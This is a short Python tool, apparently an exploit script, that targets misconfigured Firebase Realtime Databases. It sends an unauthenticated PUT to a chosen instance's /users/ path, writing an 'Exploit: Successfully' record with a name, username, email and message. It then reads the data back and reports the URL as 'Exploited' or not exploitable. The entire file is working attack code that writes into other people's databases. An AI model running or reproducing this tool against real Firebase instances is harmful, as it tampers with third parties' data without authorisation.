import json
from urllib.request import urlopen

import requests


class ExploitByExpoFileTool:
    def __init__(self, firebase_instance, file, name, nick_name, email, message):
        self.firebaseInstance = firebase_instance
        self.File = file
        self.Name = name
        self.Nick_Name = nick_name
        self.Email = email
        self.Message = message

    def firebase_exploit(self):
        print("\nVerifying if Exploit Successful...\n")
        firebase_instance_url = "https://" + self.firebaseInstance + ".firebaseio.com/users/" + self.File + ".json"
        data = {"Exploit": "Successfully", "Name": self.Name, "Username": self.Nick_Name, "Email": self.Email,
                "Message": self.Message}
        response = requests.put(firebase_instance_url, json=data)

        def show_data(input_firebase_instance_url):
            print(
                "Data Uploaded on Database: \n" +
                json.dumps(json.loads(urlopen(input_firebase_instance_url).read(
                ))))

        try:  # Response Codes
            if response.status_code == 200:
                print(f"Exploited Url: {firebase_instance_url}")
                show_data(firebase_instance_url)
            if response.status_code == 401:
                print("NOT EXPLOITABLE; Reason: All Permissions Denied")
            if response.status_code == 404:
                print("NOT EXPLOITABLE; Reason: Firebase DB Not Found")
        except Exception as ex:
            print("NOT EXPLOITABLE; Reason: Reason: Unknown Error")
            print(ex)
